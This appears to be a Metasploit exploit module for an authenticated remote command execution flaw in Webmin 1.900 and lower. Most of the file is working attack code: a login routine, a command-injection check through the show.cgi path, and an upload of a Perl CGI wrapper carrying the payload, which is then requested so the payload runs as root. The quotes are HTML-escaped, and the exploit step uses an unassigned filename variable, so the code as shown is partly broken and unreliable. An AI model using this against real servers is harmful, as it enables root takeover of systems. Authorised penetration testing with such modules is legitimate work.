# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Webmin Upload Authenticated RCE&#039;,
      &#039;Description&#039;    => %q(
        This module exploits an arbitrary command execution vulnerability in Webmin
        1.900 and lower versions. Any user authorized to the "Upload and Download"
        module can execute arbitrary commands with root privileges.

        In addition, if the &#039;Running Processes&#039; (proc) privilege is set the user can
        accurately determine which directory to upload to. Webmin application files
        can be written/overwritten, which allows remote code execution. The module
        has been tested successfully with Webmin 1.900 on Ubuntu v18.04.

        Using GUESSUPLOAD attempts to use a default installation path in order to
        trigger the exploit.
      ),
      &#039;Author&#039;         => [
        &#039;AkkuS <Azkan Mustafa AkkuA>&#039;,                  # Vulnerability Discovery, Initial PoC module
        &#039;Ziconius <Kris.Anderson[at]immersivelabs.com>&#039; # Updated MSF module; removing &#039;proc&#039; requirement.
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;46201&#039;],
          [&#039;URL&#039;, &#039;https://pentest.com.tr/exploits/Webmin-1900-Remote-Command-Execution.html&#039;]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Space&#039;       => 512,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;perl&#039;
            }
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 10000,
          &#039;SSL&#039;   => true
        },
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        => [[&#039;Webmin <= 1.900&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Jan 17 2019&#039;,
      &#039;DefaultTarget&#039;  => 0)
    )
    register_options [
        OptBool.new(&#039;GUESSUPLOAD&#039;, [true, &#039;If no "proc" permissions exists use default path.&#039;, false]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;Webmin Username&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;Webmin Password&#039;]),
        OptString.new(&#039;FILENAME&#039;,  [false, &#039;Filename used for the uploaded data&#039;]),
        OptString.new(&#039;TARGETURI&#039;,  [true, &#039;Base path for Webmin application&#039;, &#039;/&#039;])
    ]
  end

  def login
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;session_login.cgi&#039;),
      &#039;cookie&#039; => &#039;testing=1&#039;,
      &#039;vars_post&#039; => {
        &#039;page&#039; => &#039;&#039;,
        &#039;user&#039; => datastore[&#039;USERNAME&#039;],
        &#039;pass&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if res && res.code == 302 && res.get_cookies =~ /sid=(\w+)/
      return $1
    end

    return nil unless res
    &#039;&#039;
  end

  ##
  # Target and input verification
  ##
  def check
    cookie = login
    return CheckCode::Detected if cookie == &#039;&#039;
    return CheckCode::Unknown if cookie.nil?

    vprint_status(&#039;Attempting to execute...&#039;)
    command = "echo #{rand_text_alphanumeric(0..9)}"

    res = send_request_cgi({
      &#039;uri&#039;     => "#{target_uri}/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
      &#039;cookie&#039;  => "sid=#{cookie}"
    })

    if res && res.code == 200 && res.message =~ /Document follows/
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  ##
  # Exploiting phase
  ##
  def exploit
    cookie = login
    if cookie == &#039;&#039; || cookie.nil?
      fail_with(Failure::Unknown, &#039;Failed to retrieve session cookie&#039;)
    end
    print_good("Session cookie: #{cookie}")

    ##
    # Directory and SSL verification for referer
    ##
    phost = ssl ? &#039;https://&#039; : &#039;http://&#039;
    phost << peer
    print_status("Target URL => #{phost}")

    res = send_request_raw(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;proc&#039;, &#039;index_tree.cgi&#039;),
      &#039;headers&#039; =>
        {
          &#039;Referer&#039; => "#{phost}/sysinfo.cgi?xnavigation=1"
        },
      &#039;cookie&#039; => "redirect=1; testing=1; sid=#{cookie}"
    )
    unless res && res.code == 200
      fail_with(Failure::Unknown, &#039;Request failed&#039;)
    end

    print_status &#039;Searching for directory to upload...&#039;
    if res.body =~ /Running Processes/ && res.body =~ /[^ ] ([\/\w]+)miniserv\.pl/
      directory = $1
    elsif datastore[&#039;GUESSUPLOAD&#039;]
      print_warning(&#039;Could not determine upload directory. Using /usr/share/webmin/&#039;)
      directory = &#039;/usr/share/webmin/&#039;
    else
      print_error(&#039;Failed to determine webmin share directory&#039;)
      print_error(&#039;Set GUESSUPLOAD to attempt upload to a default location&#039;)
      return
    end
    directory << &#039;file&#039;
    filename << &#039;.cgi&#039; unless filename.end_with?(&#039;.cgi&#039;)
    upload_attempt(phost, cookie, directory, filename)

    ##
    # Loading phase of the vulnerable file
    # Command execution and shell retrieval
    ##
    print_status("Attempting to execute the payload...")
    command = payload.encoded
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri, &#039;file&#039;, filename),
      &#039;cookie&#039;  => "sid=#{cookie}"
    })
  end

  def upload_attempt(phost, cookie, dir, filename)
    limit = rand_text_alpha_upper(5..10)
    tmpvar = rand_text_alpha_upper(3..8)
    code = <<~HERE
    #!/usr/bin/perl
    $#{tmpvar} = <<&#039;#{limit}&#039;;
    #{payload.encoded}
    #{limit}
    `$#{tmpvar}`;
    HERE

    message = Rex::MIME::Message.new
    message.add_part(code, nil, nil, "form-data; name=\"upload0\"; filename=\"#{filename}\"")
    message.add_part(dir, nil, nil, &#039;form-data; name="dir"&#039;)
    message.add_part(&#039;root&#039;, nil, nil, &#039;form-data; name="user"&#039;)
    message.add_part(&#039;1&#039;, nil, nil, &#039;form-data;  name="group_def"&#039;)
    message.add_part(&#039;&#039;, nil, nil, &#039;form-data;  name="group"&#039;)
    message.add_part(&#039;0&#039;, nil, nil, &#039;form-data;  name="zip"&#039;)
    message.add_part(&#039;1&#039;, nil, nil, &#039;form-data;  name="email_def"&#039;)
    message.add_part(&#039;Upload&#039;, nil, nil, &#039;form-data;  name="ok"&#039;)

    res2 = send_request_raw(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;updown&#039;, &#039;upload.cgi&#039;),
      &#039;vars_get&#039; => {&#039;id&#039; => "#{rand_text_numeric(8..12)}"},
      &#039;data&#039; => message.to_s,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{message.bound}",
      &#039;headers&#039; =>
        {
          &#039;Referer&#039; => "#{phost}/updown/?xnavigation=1"
        },
      &#039;cookie&#039; => "redirect=1; testing=1; sid=#{cookie}"
    )

    if res2 && res2.code == 200 && res2.body =~ /Saving file/
      print_good "File #{filename} was successfully uploaded."
      register_file_for_cleanup(filename)
    else
      print_error &#039;Upload failed.&#039;
      fail_with(Failure::UnexpectedReply, &#039;Failed to upload file&#039;)
    end
  end
end

